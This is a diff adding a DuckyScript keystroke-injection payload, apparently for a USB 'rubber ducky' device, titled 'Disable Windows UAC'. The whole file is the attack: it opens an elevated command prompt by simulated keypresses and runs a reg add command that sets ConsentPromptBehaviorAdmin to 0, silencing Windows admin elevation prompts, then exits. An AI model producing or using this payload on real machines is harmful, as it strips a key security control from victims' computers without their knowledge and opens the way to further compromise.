@@ -1,0 +1,11 @@
+REM Title: Disable Windows UAC
+REM Author: SoggyCow
+REM Description: Disables Windows UAC by setting ConsentPromptBehaviorAdmin to 0 in the registry and closes the terminal
+
+ DELAY 1000
+ GUI r
+ DELAY 500
+ STRING cmd
+ CTRL-SHIFT ENTER
+ DELAY 1500
+ STRING reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f && exit ENTER
